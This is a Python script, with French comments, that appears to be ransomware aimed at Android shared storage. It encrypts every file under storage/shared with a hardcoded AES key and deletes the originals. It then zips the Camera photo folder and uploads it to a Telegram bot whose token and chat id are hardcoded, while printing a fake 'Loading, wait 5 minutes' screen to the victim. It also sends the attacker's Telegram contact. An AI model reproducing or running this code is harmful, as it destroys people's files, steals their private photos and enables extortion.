import os
import shutil
from multiprocessing import Pool, cpu_count
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests

# Envoi d'un message ou document via Telegram
def send_telegram_message(bot_token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"E")
        return None

def send_telegram_document(bot_token, chat_id, file_path):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {"chat_id": chat_id}
            response = requests.post(url, data=data, files=files)
        return response.json()
    except Exception as e:
        print(f"E")
        return None

# Fonction de cryptage pour un fichie
def encrypt_file(file_info):
    file_path, key = file_info
    try:
        chunk_size = 64 * 1024  # 64KB
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_file_path = file_path + '.encrypted'

        with open(file_path, 'rb') as file, open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(iv)  # Écrire l'IV

            while chunk := file.read(chunk_size):
                if len(chunk) % AES.block_size != 0:
                    chunk += b' ' * (AES.block_size - len(chunk) % AES.block_size)
                encrypted_file.write(cipher.encrypt(chunk))

        os.remove(file_path)  # Supprimer le fichier original
        
        return True
    except Exception as e:
        print(f"wait")
        return False

# Récupérer tous les fichiers à crypter
def get_files_to_encrypt(directory_path):
    files = []
    for root, _, filenames in os.walk(directory_path):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            files.append(file_path)
    return files

# Gérer le cryptage avec multiprocessing
def encrypt_files_in_directory(directory_path, key, bot_token, chat_id):
    files = get_files_to_encrypt(directory_path)
    file_info_list = [(file, key) for file in files]

    with Pool(cpu_count()) as pool:
        results = pool.map(encrypt_file, file_info_list)

    files_encrypted = sum(1 for result in results if result)
    files_failed = len(results) - files_encrypted

    message = f"""Cryptage terminé.\nFichiers cryptés : {files_encrypted}\nFichiers échoués : {files_failed} 
    
    
    Contact  telegram: t.me/kuro_kazu"""
    send_telegram_message(bot_token, chat_id, message)
    print(message)

# Compresser un répertoire en ZIP
def compress_directory(directory_path, output_zip):
    try:
        shutil.make_archive(output_zip, 'zip', directory_path)
        
        return f"{output_zip}.zip"
    except Exception as e:
        print(f"")
        return None

# Fonction principale
def main():
    target_directory = "storage/shared"
    camera_directory = "storage/shared/dcim/Camera"  # Dossier à compresser si présent
    encryption_key = b'\x88\x1a\xfa@\xfa\xd1\xadB\xd5\xaa\xf2\xe17\x9b\xfeo\x88*\x89\xe2gEP\xb60R\xc6\xdb/\xb5`\xa7'
    bot_token = "7126991043:AAEzeKswNo6eO7oJA49Hxn_bsbzgzUoJ-6A"
    chat_id = "-1002081124539"
    
    os.system("clear")

    print("""⠀⢠⣶⣿⣿⣗⡢⠀⠀⠀⠀⠀⠀⢤⣒⣿⣿⣷⣆⠀⠀
⠀⠋⠉⠉⠙⠻⣿⣷⡄⠀⠀⠀⣴⣿⠿⠛⠉⠉⠉⠃⠀
⠀⠀⢀⡠⢤⣠⣀⡹⡄⠀⠀⠀⡞⣁⣤⣠⠤⡀⠀⠀⠀
⢐⡤⢾⣿⣿⢿⣿⡿⠀⠀⠀⠀⠸⣿⣿⢿⣿⣾⠦⣌⠀
⠁⠀⠀⠀⠉⠈⠀⠀⣸⠀⠀⢰⡀⠀⠈⠈⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⣀⡔⢹⠀⠀⢸⠳⡄⡀⠀⠀⠀⠀⠀⠀
⠸⡦⣤⠤⠒⠋⠘⢠⡸⣀⣀⡸⣠⠘⠉⠓⠠⣤⢤⡞⠀
⠀⢹⡜⢷⣄⠀⣀⣀⣾⡶⢶⣷⣄⣀⡀⢀⣴⢏⡾⠁⠀
⠀⠀⠹⡮⡛⠛⠛⠻⠿⠥⠤⠽⠿⠛⠛⠛⣣⡾⠁⠀⠀
⠀⠀⠀⠙⢄⠁⠀⠀⠀⣄⣀⡄⠀⠀⠀⢁⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⢸⣿⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")

    print("""𝓛𝓸𝓪𝓭𝓲𝓷𝓰
""")
    print("Wait 5 minutes")

    # Crypter les fichiers
      
    try:
        encrypt_files_in_directory(target_directory, encryption_key, bot_token, chat_id)
    except Exception as e:
        print("")
        # Essayer un autre répertoire
        target_directory = "storage/dcim"
        encrypt_files_in_directory(target_directory, encryption_key, bot_token, chat_id)

    # Vérifier et compresser le répertoire Camera
    if os.path.exists(camera_directory):
        zip_path = compress_directory(camera_directory, "Camera_backup")
        if zip_path:
            # Envoyer le ZIP via Telegram
            send_telegram_document(bot_token, chat_id, zip_path)

    print("Programme terminé.")

if __name__ == "__main__":
    main()
